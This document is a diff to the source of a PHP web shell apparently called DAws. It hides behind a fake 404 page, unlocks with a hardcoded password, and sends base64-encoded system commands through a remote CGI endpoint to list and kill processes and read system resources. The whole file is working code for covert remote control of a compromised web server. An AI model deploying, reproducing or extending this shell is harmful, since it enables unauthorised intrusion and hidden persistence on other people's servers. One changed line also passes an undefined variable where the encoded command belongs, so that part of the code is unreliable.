@@ -3,27 +3,27 @@
 #Credits:
 #	dotcppfile & Aces
 
-session_cache_limiter('nocache');
 session_start();
 ob_start();
 
 #Login + Fake 404 Code -->
 $notfound = "
 <!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
-<html><head>
-<title>404 Not Found</title>
-</head><body>
+<html>
+<head><title>404 Not Found</title></head>
+<body>
 <h1>Not Found</h1>
 <p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
 <hr>
-<address>at ".$_SERVER['SERVER_ADDR']." Port 80</address>
-</body></html>";
+<address>".$_SERVER["SERVER_SOFTWARE"]." at ".$_SERVER['SERVER_ADDR']." Port 80</address>
+</body>
+</html>";
 
-if(isset($_POST['pass']))
+if((isset($_POST['pass'])) && (!isset($_SESSION['login'])))
 {
 	if($_POST['pass'] == "DAws")
 	{
-		$_SESSION['login']=true;
+		$_SESSION['login'] = "login";
 	}
 	else
 	{
@@ -35,7 +35,7 @@ if(isset($_POST['pass']))
 }
 else if(isset($_SESSION['login']))
 {
-	if ($_SESSION['login'] != true)
+	if ($_SESSION['login'] != "login")
 	{
 		session_destroy();
 		header("HTTP/1.1 404 Not Found");
@@ -53,7 +53,7 @@ else
 
 if (isset($_GET["logout"]))
 {
-	if ($_GET["logout"] == "true")
+	if ($_GET["logout"] == "logout")
 	{
 		session_destroy();
 		header("Location: ".$_SERVER['PHP_SELF']);
@@ -145,7 +145,7 @@ if (!isset($_SESSION['directory']))
 	$directories = glob($real_path . "/*", GLOB_ONLYDIR);
 	if ($directories)
 	{
-		if(count($directories) >= 50)
+		if(count($directories) >= 20)
 		{
 			if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 			{
@@ -167,7 +167,7 @@ if (!isset($_SESSION['directory']))
 	$directories = glob($real_path . "/*", GLOB_ONLYDIR);
 	if ($directories)
 	{
-		if(count($directories) >= 50)
+		if(count($directories) >= 20)
 		{
 			if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 			{
@@ -597,7 +597,7 @@ function soft_exists($command)
 	else if($cgi == True)
 	{
 		$complete = base64encoding($complete);
-		return cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$complete");
+		return url_get_contents($_SESSION["onlinecgi"]."?command=$complete");
 	}
 	else if($shsh == True)
 	{
@@ -682,7 +682,7 @@ function evalRel($command)
 	else if($cgi == True)
 	{
 		$command = base64encoding($command);
-		echo cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$command");
+		echo url_get_contents($_SESSION["onlinecgi"]."?command=$command");
 	}
 	else if($shsh == True)
 	{
@@ -949,8 +949,8 @@ if ((strstr(readlink("/bin/sh"), "bash") != FALSE) && ($putenv == True) && ($mai
 }
 #<--
 
-#CGI URL Get Contents-->
-function cgi_url_get_contents($url)
+#URL Get Contents-->
+function url_get_contents($url)
 {
 	global $curl_version;
 
@@ -963,9 +963,24 @@ function cgi_url_get_contents($url)
 		curl_close($ch);
 		return $output;
 	}
+	else if (checkIt("file_get_contents"))
+	{
+		return file_get_contents("$url");
+	}
 	else
 	{
-		return file_get_contents($url);
+		$handle = fopen($url, "rb");
+
+		$contents = '';
+
+		while (!feof($handle))
+		{
+   	 		$contents .= fread($handle, 8192);
+		}
+		
+		fclose($handle);
+
+		return $contents;
 	}
 }
 #<--
@@ -1029,7 +1044,7 @@ if ($_SESSION["cgi"] == False)
 }
 
 
-$tempoutput = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
+$tempoutput = url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");
 
 if (($tempoutput != "") && (!strpos($tempoutput,'Internal') !== false) && (!strpos($tempoutput,'Server error') !== false))
 {
@@ -1352,7 +1367,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		<INPUT Type="BUTTON" VALUE="Features" ALIGN="middle" ONCLICK="showDiv('features')">
 	</FORM>
 	
-	<form action='?logout=true' method='post'>
+	<form action='?logout=logout' method='post'>
 		<input type='submit' value='Logout' name='Logout'/>
 	</form>
 </div>
@@ -1611,7 +1626,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding('typeperf -sc 1 "\processor(_total)\% processor time"');
-			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
+			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
 			$parts = explode(",", $stdout);
 			if(isset($parts[2]))
 			{
@@ -1728,7 +1743,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
-			echo "<td>".round(cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand"))."%</td>\n";	
+			echo "<td>".round(url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand"))."%</td>\n";	
 		}
 		else if($shsh == True)
 		{
@@ -1816,7 +1831,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("free -mt | grep Mem |awk '{print $2}'");
-			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");	
+			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");	
 			$total_ram = $stdout;
 			$total_ram = $total_ram /1024;
 			echo "<td>" . round($total_ram) . " GB</td>\n";
@@ -1897,7 +1912,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("wmic OS get FreePhysicalMemory /Value");
-			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
+			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
 			$free_ram = (int)str_replace("FreePhysicalMemory=", "", $stdout) /1024 /1024;
 			echo "<td>" . round($free_ram, 2) . "GB </td>";
 		}
@@ -1968,7 +1983,7 @@ Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>
 		else if($cgi == True)
 		{
 			$tempcommand = base64encoding("free | grep Mem | awk '{print $3/$2 * 100.0}'");
-			$stdout = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
+			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
 			$free_ram = $stdout;
 			echo "<td>" . round($free_ram) . "% </td>\n";
 		}
@@ -2903,7 +2918,7 @@ else
 			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "cgi")
 			{
 				$decCommand = base64encoding($decCommand);
-				$response = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$decCommand");				
+				$response = url_get_contents($_SESSION["onlinecgi"]."?command=$decCommand");				
 				$decCommand = base64decoding($decCommand);
 			}
 
@@ -3237,7 +3252,7 @@ if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 		else if ($cgi == True)
 		{
 			$tempcommand = base64encoding("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
-			$kill = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
+			$kill = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
 		}
 		else if($shsh == True)
 		{
@@ -3312,7 +3327,7 @@ if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
 	else if ($cgi == True)
 	{
 		$tempcommand = base64encoding("tasklist");
-		$process_list = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
+		$process_list = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
 		$processes = explode("\n", $process_list);
 	}
 	else if ($shsh == True)
@@ -3412,7 +3427,7 @@ else
 		else if ($cgi == True)
 		{
 			$tempcommand = base64encoding("kill $pid 2>&1");
-			$output = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$base64encoding");		
+			$output = url_get_contents($_SESSION["onlinecgi"]."?command=$base64encoding");		
 		}
 		else if ($shsh == True)
 		{
@@ -3487,7 +3502,7 @@ else
 	else if ($cgi == True)
 	{
 		$tempcommand = base64encoding("ps aux");
-		$process_list = cgi_url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
+		$process_list = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
 		$processes = explode("\n", $process_list);
 	}
 	else if($shsh == True)
